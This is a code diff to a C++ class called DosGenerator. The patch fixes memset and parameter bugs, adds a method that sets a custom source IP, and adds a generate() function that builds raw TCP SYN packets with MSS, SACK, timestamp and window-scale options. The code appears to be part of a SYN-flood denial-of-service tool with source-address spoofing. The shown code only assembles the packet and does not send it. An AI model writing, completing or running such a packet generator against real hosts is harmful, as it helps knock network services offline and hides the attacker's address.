@@ -20,10 +20,10 @@ void DosGenerator::set_raw_fd(int raw_fd)
     raw_fd_ = raw_fd;
 }
 
-bool DosGenerator::init_iph(uint32_t& src_ip, uint32_t& dest_ip)
+bool DosGenerator::init_iph(uint32_t src_ip, uint32_t dest_ip)
 {
 
-    memset(iph_,0,sizeof(struct iphdr));
+    memset(&iph_,0,sizeof(struct iphdr));
 
     //set ip header
     iph_.version=4;
@@ -42,9 +42,9 @@ bool DosGenerator::init_iph(uint32_t& src_ip, uint32_t& dest_ip)
 
 }
 
-bool DosGenerator::init_tcph(uint16_t &src_port, uint16_t &dest_port)
+bool DosGenerator::init_tcph(uint16_t src_port, uint16_t dest_port)
 {
-    memset(tcph_,0,sizeof(struct tcphdr));
+    memset(&tcph_,0,sizeof(struct tcphdr));
 
     //set tcp header
     tcph_.doff=5;
@@ -53,6 +53,50 @@ bool DosGenerator::init_tcph(uint16_t &src_port, uint16_t &dest_port)
     tcph_.dest = htons(dest_port);
 
     return true;
+
+}
+
+bool DosGenerator::set_iph_src(uint32_t &src_ip)
+{
+    iph_.saddr=htonl(src_ip);
+
+    return true;
+}
+
+void DosGenerator::generate()
+{
+    //make packet buf
+    uint8_t packet[sizeof(struct iphdr) + sizeof(struct tcphdr) + sizeof(SynOptions)];
+
+    /*set MaximumSegementSize*/
+    syn_options_.maximumSegementSize.kind=2; //Maximum Segment Size
+    syn_options_.maximumSegementSize.length=4;
+    syn_options_.maximumSegementSize.MSSvalue=ntohs(1420); //set MSS value 1420
+
+    /*set TCP SACK Permitted option*/
+    syn_options_.tcpSackPermittedOption.kind=4; //SACK Permitted
+    syn_options_.tcpSackPermittedOption.length=2;
+
+    /* set Time Stamps*/
+    syn_options_.timestamp.kind=8; //Time Stamp Option
+    syn_options_.timestamp.length=10;
+    syn_options_.timestamp.timeStampValue=0;
+    syn_options_.timestamp.timeStampEchoReply=0;
+
+    //No-Operation is already set
+
+    /* set Window Scale*/
+    syn_options_.windowScale.kind=3; //Window Scale
+    syn_options_.windowScale.length=3;
+    syn_options_.windowScale.shifCount=7;
+
+
+    //packet fill with ip, tcp, syn option
+    memcpy(packet,&iph_,sizeof(struct iphdr));
+    memcpy(packet + sizeof(struct iphdr),&tcph_,sizeof(struct tcphdr));
+    memcpy(packet + sizeof(struct iphdr) + sizeof(struct tcphdr),&syn_options_,sizeof(SynOptions));
+
+
 
 }
 
